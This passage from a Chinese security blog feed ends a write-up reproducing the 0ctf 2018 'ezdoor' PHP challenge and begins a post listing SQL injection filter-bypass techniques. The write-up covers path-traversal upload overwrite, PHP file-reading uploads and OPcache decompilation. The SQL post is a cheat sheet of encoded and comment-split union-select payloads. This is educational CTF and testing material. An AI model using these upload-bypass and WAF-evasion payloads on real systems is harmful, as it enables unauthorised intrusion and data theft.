&#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $name);</span><br></pre></td></tr></table></figure><p>我们先来看preg_match中的正则表达式，在[ ]里以^开头，说明匹配的是^后面未包含的字符串，因此这个preg_match在这里并没有太大作用。不过正则表达式还是得好好看看，给大家分享一个学习正则的链接</p><p><a href="http://tool.oschina.net/uploads/apidocs/jquery/regexp.html" target="_blank" rel="noopener">http://tool.oschina.net/uploads/apidocs/jquery/regexp.html</a></p><p>后面的stristr(pathinfo)是用来判断以“.”隔断后的字符串中是否含有“h”字符，在这里pathinfo是以字符串中最后一个“.”来进行隔断。</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=<span class="string">"index.php.exe"</span>;</span><br><span class="line"><span class="keyword">echo</span>(pathinfo($name)[<span class="string">"extension"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出为exe,因此我们可以在upload处进行上传绕过</p></li></ul><ul><li><h3 id="利用”-”绕过上传检测"><a href="#利用”-”绕过上传检测" class="headerlink" title="利用”/.”绕过上传检测"></a>利用”/.”绕过上传检测</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> $name = <span class="string">"index.php/."</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="string">"/[^a-zA-Z0-9.\/]/"</span>, $name) ||</span><br><span class="line">    stristr(pathinfo($name)[<span class="string">"extension"</span>], <span class="string">"h"</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"false"</span>;</span><br></pre></td></tr></table></figure><p>此时输出为false，虽然现在我们可以绕过上传，但是无法进行覆盖。因此我们需要重新构造文件名实现上传覆盖。</p></li><li><h3 id="利用”test-index-php-”上传覆盖"><a href="#利用”test-index-php-”上传覆盖" class="headerlink" title="利用”test/../index.php/.”上传覆盖"></a>利用”test/../index.php/.”上传覆盖</h3><p>构造form表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.1.188:8585/index.php?action=upload&amp;name=test/../index.php/."</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本地构造index.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"666"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传之后查看<a href="http://192.168.1.188/index.php?action=shell" target="_blank" rel="noopener">http://192.168.1.188/index.php?action=shell</a></p><p>看到页面输出“666”，发现成功覆盖 </p><p>获取flag下文件，构造index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    var_dump(scandir(<span class="string">'/var/www/html/'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传后查看<a href="http://192.168.1.188/index.php?action=shell" target="_blank" rel="noopener">http://192.168.1.188/index.php?action=shell</a></p><p>得到以下信息</p><p><img src="/04/2018-0ctf-ezdoor复现/1.png" alt></p><p>获取flag下的文件</p><p>通过构造index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    print_r(file_get_contents(<span class="string">'/var/www/html/flag/93f4c28c0cf0b07dfd7012dca2cb868cc0228cad'</span>))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到flag.php.ini,输出信息如下</p><p><img src="/04/2018-0ctf-ezdoor复现/2.png" alt></p><p>因为OPcache文件是以”OPcache.”开头的，但是发现上面输出信息中opcache后缺少”.”，因此将上述信息保存为本地文件，并命名为flag.php.ini，利用winhex对文件进行修复</p></li><li><h3 id="opcode反编译"><a href="#opcode反编译" class="headerlink" title="opcode反编译"></a>opcode反编译</h3><p>工具链接</p><p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p><p>安装库依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install construct==2.8.22</span><br><span class="line">pip install treelib</span><br><span class="line">pip install termcolor</span><br></pre></td></tr></table></figure><p>反编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">./opcache_disassembler.py -c -a64 flag.php.bin</span><br></pre></td></tr></table></figure><p>反编译后的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">function encrypt() &#123;</span><br><span class="line">  #0 !0 = RECV(None, None);</span><br><span class="line">  #1 !0 = RECV(None, None);</span><br><span class="line">  #2 DO_FCALL_BY_NAME(None, &apos;mt_srand&apos;);</span><br><span class="line">  #3 SEND_VAL(1337, None);</span><br><span class="line">  #4 (129)?(None, None);</span><br><span class="line">  #5 ASSIGN(!0, &apos;&apos;);</span><br><span class="line">  #6 (121)?(!0, None);</span><br><span class="line">  #7 ASSIGN(None, None);</span><br><span class="line">  #8 (121)?(!0, None);</span><br><span class="line">  #9 ASSIGN(None, None);</span><br><span class="line">  #10 ASSIGN(None, 0);</span><br><span class="line">  #11 JMP(-&gt;-24, None);</span><br><span class="line">  #12 DO_FCALL_BY_NAME(None, &apos;chr&apos;);</span><br><span class="line">  #13 DO_FCALL_BY_NAME(None, &apos;ord&apos;);</span><br><span class="line">  #14 FETCH_DIM_R(!0, None);</span><br><span class="line">  #15 (117)?(None, None);</span><br><span class="line">  #16 (129)?(None, None);</span><br><span class="line">  #17 DO_FCALL_BY_NAME(None, &apos;ord&apos;);</span><br><span class="line">  #18 MOD(None, None);</span><br><span class="line">  #19 FETCH_DIM_R(!0, None);</span><br><span class="line">  #20 (117)?(None, None);</span><br><span class="line">  #21 (129)?(None, None);</span><br><span class="line">  #22 BW_XOR(None, None);</span><br><span class="line">  #23 DO_FCALL_BY_NAME(None, &apos;mt_rand&apos;);</span><br><span class="line">  #24 SEND_VAL(0, None);</span><br><span class="line">  #25 SEND_VAL(255, None);</span><br><span class="line">  #26 (129)?(None, None);</span><br><span class="line">  #27 BW_XOR(None, None);</span><br><span class="line">  #28 SEND_VAL(None, None);</span><br><span class="line">  #29 (129)?(None, None);</span><br><span class="line">  #30 ASSIGN_CONCAT(!0, None);</span><br><span class="line">  #31 PRE_INC(None, None);</span><br><span class="line">  #32 IS_SMALLER(None, None);</span><br><span class="line">  #33 JMPNZ(None, -&gt;134217662);</span><br><span class="line">  #34 DO_FCALL_BY_NAME(None, &apos;encode&apos;);</span><br><span class="line">  #35 (117)?(!0, None);</span><br><span class="line">  #36 (130)?(None, None);</span><br><span class="line">  #37 RETURN(None, None);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function encode() &#123;</span><br><span class="line">  #0 RECV(None, None);</span><br><span class="line">  #1 ASSIGN(None, &apos;&apos;);</span><br><span class="line">  #2 ASSIGN(None, 0);</span><br><span class="line">  #3 JMP(-&gt;-81, None);</span><br><span class="line">  #4 DO_FCALL_BY_NAME(None, &apos;dechex&apos;);</span><br><span class="line">  #5 DO_FCALL_BY_NAME(None, &apos;ord&apos;);</span><br><span class="line">  #6 FETCH_DIM_R(None, None);</span><br><span class="line">  #7 (117)?(None, None);</span><br><span class="line">  #8 (129)?(None, None);</span><br><span class="line">  #9 (117)?(None, None);</span><br><span class="line">  #10 (129)?(None, None);</span><br><span class="line">  #11 ASSIGN(None, None);</span><br><span class="line">  #12 (121)?(None, None);</span><br><span class="line">  #13 IS_EQUAL(None, 1);</span><br><span class="line">  #14 JMPZ(None, -&gt;-94);</span><br><span class="line">  #15 CONCAT(&apos;0&apos;, None);</span><br><span class="line">  #16 ASSIGN_CONCAT(None, None);</span><br><span class="line">  #17 JMP(-&gt;-96, None);</span><br><span class="line">  #18 ASSIGN_CONCAT(None, None);</span><br><span class="line">  #19 PRE_INC(None, None);</span><br><span class="line">  #20 (121)?(None, None);</span><br><span class="line">  #21 IS_SMALLER(None, None);</span><br><span class="line">  #22 JMPNZ(None, -&gt;134217612);</span><br><span class="line">  #23 RETURN(None, None);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#0 ASSIGN(None, &apos;input_your_flag_here&apos;);</span><br><span class="line">#1 DO_FCALL_BY_NAME(None, &apos;encrypt&apos;);</span><br><span class="line">#2 SEND_VAL(&apos;this_is_a_very_secret_key&apos;, None);</span><br><span class="line">#3 (117)?(None, None);</span><br><span class="line">#4 (130)?(None, None);</span><br><span class="line">#5 IS_IDENTICAL(None, &apos;85b954fc8380a466276e4a48249ddd4a199fc34e5b061464e4295fc5020c88bfd8545519ab&apos;);</span><br><span class="line">#6 JMPZ(None, -&gt;-136);</span><br><span class="line">#7 ECHO(&apos;Congratulation! You got it!&apos;, None);</span><br><span class="line">#8 EXIT(None, None);</span><br><span class="line">#9 ECHO(&apos;Wrong Answer&apos;, None);</span><br><span class="line">#10 EXIT(None, None);</span><br></pre></td></tr></table></figure><p>官方逆向后的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    $hex=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($string); $i++)&#123;</span><br><span class="line">        $tmp = dechex(ord($string[$i]));</span><br><span class="line">        <span class="keyword">if</span>(strlen($tmp) == <span class="number">1</span>)&#123;</span><br><span class="line">            $hex .= <span class="string">"0"</span> . $tmp;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $hex .= $tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($pwd, $data)</span></span>&#123;</span><br><span class="line">    mt_srand(<span class="number">1337</span>);</span><br><span class="line">    $cipher = <span class="string">""</span>;</span><br><span class="line">    $pwd_length = strlen($pwd);</span><br><span class="line">    $data_length = strlen($data);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $data_length; $i++) &#123;</span><br><span class="line">        $cipher .= chr(ord($data[$i]) ^ ord($pwd[$i % $pwd_length]) ^ mt_rand(<span class="number">0</span>, <span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> encode($cipher);</span><br><span class="line">&#125;</span><br><span class="line">$flag = <span class="string">"input_your_flag_here"</span>;</span><br><span class="line"><span class="keyword">if</span>(encrypt(<span class="string">"this_is_a_very_secret_key"</span>, $flag) === <span class="string">"85b954fc8380a466276e4a48249ddd4a199fc34e5b061464e4295fc5020c88bfd8545519ab"</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Congratulation! You got it!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wrong Answer"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>我们将代码分解开来进行分析，首先是encode()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    $hex=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($string); $i++)&#123;</span><br><span class="line">        $tmp = dechex(ord($string[$i]));</span><br><span class="line">        <span class="keyword">if</span>(strlen($tmp) == <span class="number">1</span>)&#123;</span><br><span class="line">            $hex .= <span class="string">"0"</span> . $tmp;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $hex .= $tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现该函数是将$string的每一位转换为ASCII码后，再转换为十六进制，如果转换的十六进制位数是一位的话就在前面添0，然后将每一位的十六进制拼接起来。</p><p>我们再来看encrypt函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($pwd, $data)</span></span>&#123;</span><br><span class="line">    mt_srand(<span class="number">1337</span>);</span><br><span class="line">    $cipher = <span class="string">""</span>;</span><br><span class="line">    $pwd_length = strlen($pwd);</span><br><span class="line">    $data_length = strlen($data);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $data_length; $i++) &#123;</span><br><span class="line">        $cipher .= chr(ord($data[$i]) ^ ord($pwd[$i % $pwd_length]) ^ mt_rand(<span class="number">0</span>, <span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> encode($cipher);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是一个随机数发生器种子，在这里pwd我们是已知的，因此长度也是已知量,data是我们要得到的flag，data的长度也是未知量，在for循环中我们看到有一条异或的语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cipher .= chr(ord($data[$i]) ^ ord($pwd[$i % $pwd_length]) ^ mt_rand(<span class="number">0</span>, <span class="number">255</span>));</span><br></pre></td></tr></table></figure><p>这句话其实是可逆的，因此得出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(ord($data[$i])= $cipher[$i] ^ ord($pwd[$i % $pwd_length]) ^ mt_rand(<span class="number">0</span>, <span class="number">255</span>));</span><br></pre></td></tr></table></figure><p>由最后的if判断我们可以得到，加密后的密文长度为74位，因此我们根据encode()函数可以得出flag的长度是37位，因此我们的mt_rand()生成的随机数至少应该是37位，因此我们利用python编写解密脚本如下。</p><p>python版本：2.x</p><p>php版本：php7.2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwd=<span class="string">"this_is_a_very_secret_key"</span></span><br><span class="line">rand=[<span class="number">151</span>,<span class="number">189</span>,<span class="number">92</span>,<span class="number">232</span>,<span class="number">167</span>,<span class="number">217</span>,<span class="number">167</span>,<span class="number">90</span>,<span class="number">114</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">72</span>,<span class="number">9</span>,<span class="number">134</span>,<span class="number">182</span>,<span class="number">90</span>,<span class="number">23</span>,<span class="number">152</span>,<span class="number">129</span>,<span class="number">27</span>,<span class="number">93</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">114</span>,<span class="number">194</span>,<span class="number">105</span>,<span class="number">104</span>,<span class="number">203</span>,<span class="number">65</span>,<span class="number">60</span>,<span class="number">215</span>,<span class="number">147</span>,<span class="number">238</span>,<span class="number">81</span>,<span class="number">111</span>,<span class="number">91</span>,<span class="number">179</span>,<span class="number">57</span>,<span class="number">195</span>]</span><br><span class="line">sec=<span class="string">"85b954fc8380a466276e4a48249ddd4a199fc34e5b061464e4295fc5020c88bfd8545519ab"</span>.decode(<span class="string">"hex"</span>)</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">37</span>):</span><br><span class="line">    flag+=chr(rand[i]^ord(sec[i])^ord(pwd[i%len(pwd)]))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0pc4che_b4ckd00r_is_4_g0o6_ide4&#125;</span><br></pre></td></tr></table></figure><p>​</p></li></ul><ul><li><h3 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h3><p><a href="http://www.laruence.com/2008/06/18/221.html" target="_blank" rel="noopener">http://www.laruence.com/2008/06/18/221.html</a></p><p><a href="http://drops.xmd5.com/static/drops/web-15450.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/web-15450.html</a></p><p><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=626</a></p><p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p><p><a href="https://blog.csdn.net/sqzxwq/article/details/47786345" target="_blank" rel="noopener">https://blog.csdn.net/sqzxwq/article/details/47786345</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;h3 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h3&gt;&lt;p&gt;之前在做0ctf的时候就看了这一道php代码审计题目，当时没做出来，好在github上有源码，决定在服务器
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入下的bypass</title>
    <link href="elssm.github.io/2018/05/03/SQL%E6%B3%A8%E5%85%A5%E4%B8%8B%E7%9A%84bypass/"/>
    <id>elssm.github.io/2018/05/03/SQL注入下的bypass/</id>
    <published>2018-05-03T08:09:14.000Z</published>
    <updated>2018-05-03T08:27:56.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1) 大小写混合 </span><br><span class="line">2)替换关键字 </span><br><span class="line">3)使用编码 </span><br><span class="line">4)使用注释 </span><br><span class="line">5)等价函数与命令 </span><br><span class="line">6)使用特殊符号 </span><br><span class="line">7)缓冲区溢出 </span><br><span class="line">8)整合绕过</span><br></pre></td></tr></table></figure><h3 id="a-大小写绕过"><a href="#a-大小写绕过" class="headerlink" title="a) 大小写绕过"></a>a) 大小写绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">大小写绕过用于只针对小写或大写的关键字匹配技术正则表达式/express/i 匹配时大小写不敏感便无法绕过这是最简单的绕过技术</span><br><span class="line"></span><br><span class="line">z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</span><br></pre></td></tr></table></figure><h3 id="b-替换关键字"><a href="#b-替换关键字" class="headerlink" title="b)替换关键字"></a>b)替换关键字</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</span><br><span class="line"></span><br><span class="line">z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4 </span><br><span class="line">替换关键字同样是很基础的技术也可以构造得更复杂SeLSeselectleCTecT关键要看正则表达式会进行几次匹配处理了</span><br></pre></td></tr></table></figure><h3 id="c-使用编码"><a href="#c-使用编码" class="headerlink" title="c)使用编码"></a>c)使用编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在Chrome中输入一个链接非保留字的字符浏览器会对其URL编码如空格变为%20、单引号%27、左括号%28、右括号%29</span><br><span class="line"></span><br><span class="line">普通的URL编码可能无法实现绕过不过存在某种情况URL编码只进行了一次解码过滤可以用两次编码绕过</span><br><span class="line"></span><br><span class="line">page.php?id=1%252f%252a*/UNION%252f%252a/SELECT</span><br></pre></td></tr></table></figure><h3 id="2-十六进制编码"><a href="#2-十六进制编码" class="headerlink" title="2.十六进制编码"></a>2.十六进制编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">z.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/1,2,3,4,SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</span><br><span class="line">示例代码中前者是对单个字符十六进制编码后者则是对整个字符串编码对整个字符串编码相对来说较少见一点</span><br></pre></td></tr></table></figure><h3 id="3-Unicode编码"><a href="#3-Unicode编码" class="headerlink" title="3.Unicode编码"></a>3.Unicode编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Unicode有所谓的标准编码和非标准编码假设我们用的utf-8为标准编码那么西欧语系所使用的就是非标准编码了</span><br><span class="line"></span><br><span class="line">看一下常用的几个符号的一些Unicode编码</span><br><span class="line"></span><br><span class="line">单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</span><br><span class="line"></span><br><span class="line">空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</span><br><span class="line"></span><br><span class="line">左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</span><br><span class="line"></span><br><span class="line">右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</span><br><span class="line"></span><br><span class="line">举例：</span><br><span class="line"></span><br><span class="line">?id=10%D6&apos;%20AND%201=2%23　　</span><br><span class="line"></span><br><span class="line">SELECT &apos;?&apos;=&apos;A&apos;; #1</span><br><span class="line">两个示例中，前者利用双字节绕过，比如对单引号转义操作变成\&apos;，那么就变成了%D6%5C&apos;，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用。</span><br><span class="line"></span><br><span class="line">第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过。</span><br></pre></td></tr></table></figure><h3 id="d-使用注释"><a href="#d-使用注释" class="headerlink" title="d) 使用注释"></a>d) 使用注释</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">看一下常见的用于注释的符号有哪些</span><br><span class="line"></span><br><span class="line">//, -- , /**/, #, --+,-- -, ;--a</span><br></pre></td></tr></table></figure><h4 id="1-普通注释"><a href="#1-普通注释" class="headerlink" title="1.普通注释"></a>1.普通注释</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4</span><br><span class="line">&apos;union%a0select pass from users# </span><br><span class="line">/**/在构造的查询语句中插入注释规避对空格的依赖或关键字识别#、--+用于终结语句的查询</span><br></pre></td></tr></table></figure><h4 id="2-内联注释"><a href="#2-内联注释" class="headerlink" title="2.内联注释"></a>2.内联注释</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">相比普通注释内联注释用的更多/!content/只有MySQL会正常识别content的内容其他 </span><br><span class="line"></span><br><span class="line">index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3 </span><br><span class="line">?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4… </span><br><span class="line">两个示例中前者使用内联注释后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分要做到这一点后面讨论的特殊符号也能实现当然前提是包括/、*在内的这些字符能正常使用。</span><br></pre></td></tr></table></figure><h3 id="e-等价函数与命令"><a href="#e-等价函数与命令" class="headerlink" title="e)等价函数与命令"></a>e)等价函数与命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 